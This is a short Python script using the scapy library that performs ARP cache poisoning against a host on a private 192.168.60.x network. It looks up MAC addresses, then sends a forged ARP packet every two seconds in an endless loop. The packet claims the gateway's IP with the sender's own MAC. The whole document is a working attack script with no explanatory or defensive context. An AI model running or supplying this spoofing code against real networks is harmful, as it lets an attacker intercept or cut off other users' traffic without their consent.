from scapy.all import *
#ip
target_ip='192.168.60.108'
local_ip='192.168.60.79'
gateway_ip='192.168.60.254'
#mac
target_mac=getmacbyip(target_ip)
mac=get_if_hwaddr("eth0")
gateway_mac=getmacbyip(gateway_ip)

packet=Ether(dst=target_mac,src=mac)/ARP(op=1,hwsrc=mac,
psrc=gateway_ip,hwdst=target_mac,pdst=target_ip)

while 1:
	sendp(packet,inter = 2,iface="eth0")
